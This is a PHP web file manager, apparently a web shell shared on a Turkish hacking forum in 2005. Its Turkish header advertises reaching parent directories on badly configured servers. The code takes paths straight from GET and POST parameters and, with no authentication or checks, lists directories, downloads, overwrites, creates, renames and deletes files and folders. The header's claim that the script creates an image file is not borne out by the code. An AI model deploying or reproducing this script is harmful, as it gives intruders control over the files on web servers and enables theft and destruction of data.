<!-- 
AÇIKLAMALAR
Www.CiGiCiGi.Com Www.CiGiCiGi.Net Irc.CiGiCiGi.Com by Ono 

PHP ListPath by Ono for CiGiCiGi.Com
Versiyon: 1.0

Listpath, eðer serverde "Permission" lar ayarlanmamýþsa üst dizinlere eriþimi saðlar.

Açýklama:
Bu script Ono tarafýndan CigiCigi userlarý için yazýlmýþtýr.
Script makinadaki izin verilen tüm dizinlere eriþebilir ve dizinde,
1-Yeni klasör oluþturabilir,
2-Yeni dosya oluþturabilir,
3-Herhangi bir dizindeki dosyayý GZip ile sýkýþtýrýp download edebilir,
4-Dosyalarý editleyebilir,
5-Dosyalarý ve klasörleri silebilir,
6-Dosyalarý ve klasörleri yeniden adlandýrabilirsiniz.

Uyarýlar:
1-Dizinlerin sonuna / koyulmalýdýr. Dizinleri kullanýrken / kullanmaya dikkat edin. PHP'de \ sorun yaratmaktadýr.
2-Herhangi bir dosyayý download etmek için dosyaya týklamak yeterlidir. Script otomatikmen sýkýþtýrýp download'ý baþlatacaktýr.
3-Script çalýþtýðý anda, çalýþtýðý dizinde "cigiabout.gif" isimli 7 Kb boyutunda bir resim yaratmaktadýr.
4-Eðer sistemde permisionlar ayarlanmamýþsa üst dizinlere ulaþabilirsiniz. Aksi takirde üst dizinler görüntülenmeyecektir.
5-Üst dizine geçmek için .. klasörünü kullanabilirsiniz.
6-Herhangi bir hata ile karþýlaþýrsanýz aþaðýdaki iletiþim adreslerinden bana ulaþabilirsiniz.

Yeni sürüm ve download için CigiCigi.Com ve CigiCigi forumlarýný takip ediniz.

©2005 CiGiCiGi, Ono

Mail & MSN: ono@cigicigi.com
ICQ: 619769

-->
<?php
$hata = ".";
if ( !$_GET['dir'] || $_GET['dir'] == $hata ) $dir = "./";
else $dir = $_GET['dir'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9">
<title>PHP Listpath by Ono for CiGiCiGi.COM</title>
<style type="text/css">
<!--
body, table, input, pre {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
}
table {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	background-color: #999999;
	border: inset #FF0000;
}
textarea {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	height: 60%;
	width: 100%;
}
a:link {
	color: #800000;
	text-decoration: none;
}
a:visited {
	color: #800000;
	text-decoration: none;
}
a:active {
	color: #800000;
	text-decoration: none;
}
a:hover {
	color: #800000;
	text-decoration: underline;
}
-->
</style>
</head>

<body>

<?php

echo "<strong>CiGiCiGi ListPath by Ono</strong>\n<br><br>\n";
$download = $_GET['download'];
$editfile = $_GET['editfile'];
$sil = $_GET['sil'];
$klasorsil = $_GET['klasorsil'];
$yenidenad = $_GET['yenidenad'];
$klasoryenidenad = $_GET['klasoryenidenad'];
$newfile = $_GET['newfile'];
$newdir = $_GET['newdir'];
if ( $download  ) download($download);
if ( $editfile  ) edit($editfile);
if ( $sil ) sil($sil);
if ( $klasorsil ) klasorsil($klasorsil);
if ( $yenidenad ) yenidenad($yenidenad);
if ( $klasoryenidenad ) klasoryenidenad($klasoryenidenad);
if ( $newfile ) newfile($newfile);
if ( $newdir ) newdir($newdir);
echo("<form method=\"get\" action=\"\">
  <input type=\"submit\" value=\" Dizine Git \">
  <input name=\"dir\" type=\"text\" id=\"dir\" size=\"50\" value=\"$dir\"> 
  <a href=\"javascript:history.back(-1)\">Geri</a> - <a href=\"?newfile=1&dir=$dir\">Yeni Dosya Oluþtur</a> - <a href=\"?newdir=1&dir=$dir\">Yeni Klasör Oluþtur</a> 
</form>\nScriptin çalýþtýðý dizin: " . getcwd() . "<br>\nÞuan listelenen dizin: $dir<br><br>\n<table width=\"800\"  border=\"1\">
  <tr>
    <td>Dosya veya Klasör adý </td>
    <td width=\"25\">Edit</td>
    <td width=\"17\">Sil</td>
    <td width=\"100\">Yeniden Adlandýr </td>
  </tr>\n");
klasor($dir);
files($dir);
echo("</table><br><br>\n");

//Klasör Listeleme Fonksiyonu
function klasor($dir) {

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if ( filetype("$dir/$file") == dir ) echo("  <tr>
    <td><strong><a href=\"?dir=$dir$file/\" style=\"color:#990000\">$file</a></strong></td>
    <td>&nbsp;</td>
    <td><strong><a href=\"?klasorsil=$dir$file/&dir=$dir\" style=\"color:#990000\">Sil</a></strong></td>
    <td><strong><a href=\"?klasoryenidenad=$dir$file/&dir=$dir\" style=\"color:#990000\">Yeniden Adlandýr</a></strong></td>
  </tr>\n");
        }
        closedir($dh);
    }
}

}


//Dosya Listeleme Fonksiyonu
function files($dir) {

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if ( filetype("$dir/$file") == file ) {
			echo("  <tr>
    <td><a href=\"?download=$dir$file/&file=$file&dir=$dir\">$file</a> - " . filesize("$dir$file") . " BYTE</td>
    <td><a href=\"?editfile=$dir$file/&dir=$dir\">Edit</a></td>
    <td><a href=\"?sil=$dir$file/&dir=$dir\">Sil</a></td>
    <td><a href=\"?yenidenad=$dir$file/&file=$file&dir=$dir\">Yeniden Adlandýr</a></td>
  </tr>\n");
          }
        }
        closedir($dh);
    }
}

}


//GZip & Download Fonksiyonu
function download($download) {
$handle = fopen($download,"r");
$icerik = fread($handle, filesize($download));
$file = $_GET['file'];
$zp = gzopen("$file.gz", "w9");
gzwrite($zp, $icerik);
gzclose($zp);
header("Location: $file.gz");
}


//Dosya Editleme Fonksiyonu
function edit($editfile) {
$edit = $_POST['edit'];
if ( !$edit ) {
$handle = fopen($editfile,"r");
$icerik = fread($handle, filesize($editfile));
echo("<form method=\"post\" action=\"?editfile=$editfile\">
  <input name=\"edit\" type=\"hidden\" id=\"edit\" value=\"1\">
  <textarea name=\"editfileicerik\" rows=\"30\" wrap=\"OFF\">" . htmlspecialchars($icerik) . "</textarea>
  <input type=\"submit\" value=\" Editle\">\n</form>");
}
else {
$handle = fopen($editfile,"w");
fwrite($handle,$_POST['editfileicerik']);
fclose($handle);
echo("<strong>Dosya editlendi</strong><br><br>\n");
}
}


//Dosya Silme Fonksiyonu
function sil($sil) {
unlink($sil);
echo("<strong>Dosya silindi</strong><br><br>\n");
}


//Klasör Silme Fonksiyonu
function klasorsil($klasorsil) {
if ( rmdir($klasorsil) ) echo("<strong>Klasör silindi</strong><br><br>\n");
else echo("<strong>Klasör boþ deðil, silinemedi</strong><br><br>");
}


//Yeniden Adlandýrma Fonksiyonu
function yenidenad($yenidenad) {
$file = $_GET['file'];
$yeniad = $_POST['yeniad'];
if ( !$yeniad ) echo("<form method=\"post\" action=\"\">
  <input name=\"yeniad\" type=\"text\" id=\"yeniad\" value=\"$file\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeniden Adlandýr \">&nbsp;<input type=\"reset\" value=\" Þimdiki Adý \">
</form><br>\n");
else {
$dir = $_GET['dir'];
rename("$dir$file","$dir$yeniad");
echo("<strong>Dosya yeniden adlandýrýldý</strong><br><br>\n");
}
}


//Klasör Yeniden Adlandýrma FOnksiyonu
function klasoryenidenad($klasoryenidenad) {
$file = $_GET['klasoryenidenad'];
$yeniad = $_POST['yeniad'];
if ( !$yeniad ) echo("<form method=\"post\" action=\"\">
  <input name=\"yeniad\" type=\"text\" id=\"yeniad\" value=\"$file\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeniden Adlandýr \">&nbsp;<input type=\"reset\" value=\" Þimdiki Adý \">
</form><br>\n");
else {
$dir = $_GET['dir'];
rename("$dir$file","$dir$yeniad");
echo("<strong>Klasör yeniden adlandýrýldý</strong><br><br>\n");
}
}


//Yeni Dosya Oluþturma Fonksiyonu
function newfile($newfile) {
$dir = $_GET['dir'];
$filename = $_POST['filename'];
$icerik = $_POST['icerik'];
if ( !$filename || !$icerik ) echo("<form method=\"post\" action=\"\">
  <p>
    Dosya adý<br>
    <input name=\"filename\" type=\"text\" id=\"filename\">
</p>
  <p>Ýçerik<br>
    <textarea name=\"icerik\" rows=\"30\" id=\"icerik\"></textarea>
    <br>
    <input type=\"submit\" value=\" Yeni Dosya Oluþtur\">
  </p>
</form>");
else {
$handle = fopen("$dir$filename","w");
fwrite($handle,"$icerik");
echo("<strong>Yeni Dosya Oluþturuldu</strong><br><br>\n");
}
}


//Yeni Klasör Fonksiyonu
function newdir($newdir) {
$dir = $_GET['dir'];
$dirname = $_POST['dirname'];
if ( !$dirname ) echo("<form method=\"post\" action=\"\">
  <input name=\"dirname\" type=\"text\" id=\"dirname\">
  <input type=\"submit\" name=\"Submit\" value=\" Yeni Klasör Oluþtur \">
</form><br>\n");
else {
mkdir("$dir$dirname");
echo("<strong>Yeni Klasör Oluþturuldu</strong><br><br>\n");
}
}

?>

</body>
</html>
<!-- Www.CiGiCiGi.Com Www.CiGiCiGi.Net Irc.CiGiCiGi.Com by Ono -->